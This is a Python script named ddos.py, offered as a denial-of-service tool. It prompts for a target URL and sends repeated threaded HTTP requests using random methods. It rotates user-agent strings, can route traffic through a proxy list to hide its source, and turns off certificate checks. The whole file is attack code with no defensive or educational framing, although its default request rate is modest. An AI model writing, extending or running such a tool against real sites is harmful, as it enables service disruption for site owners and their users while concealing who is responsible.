# ddos.py
import requests
import concurrent.futures
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (Linux; Android 10; SM-G960U)'
]

REQUEST_METHODS = ['GET', 'POST', 'PUT', 'DELETE']

def load_proxies():
    proxy_file = input(Fore.CYAN + "Enter proxy file name (or leave blank): ")
    if proxy_file.strip():
        try:
            with open(proxy_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + "Proxy file not found! Continuing without proxies")
            return []
    return []

def send_request(target, method, proxy=None, user_agent=None):
    try:
        headers = {'User-Agent': user_agent or random.choice(USER_AGENTS)}
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        with requests.Session() as session:
            response = session.request(
                method=method,
                url=target,
                headers=headers,
                proxies=proxies,
                timeout=10,
                verify=False
            )
            return {
                'status': response.status_code,
                'time': response.elapsed.total_seconds(),
                'size': len(response.content),
                'method': method
            }
    except Exception as e:
        return {'error': str(e)}

def monitor(target, method, proxy=None, user_agent=None, interval=1):
    while True:
        start_time = time.time()
        result = send_request(target, method, proxy, user_agent)
        
        if 'error' in result:
            print(Fore.RED + f"[!] Error: {result['error']}")
        else:
            print(Fore.GREEN + f"[{method}] Status: {result['status']} | "
                  f"Time: {result['time']:.2f}s | Size: {result['size']} bytes")
        
        sleep_time = interval - (time.time() - start_time)
        if sleep_time > 0:
            time.sleep(sleep_time)

def start_ddos():
    print(Fore.MAGENTA + "=== Starting DDOS Attack ===")
    target = input(Fore.YELLOW + "Enter target URL: ")
    threads = int(input("Number of threads (1-10): ") or 5)
    interval = float(input("Request interval (seconds): ") or 0.5)
    
    methods = input("HTTP methods (comma separated, default: GET,POST,PUT,DELETE): ")
    methods = [m.strip().upper() for m in methods.split(',')] if methods else REQUEST_METHODS
    
    proxies = load_proxies()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            method = random.choice(methods)
            proxy = random.choice(proxies) if proxies else None
            user_agent = random.choice(USER_AGENTS)
            
            executor.submit(
                monitor,
                target=target,
                method=method,
                proxy=proxy,
                user_agent=user_agent,
                interval=interval
            )
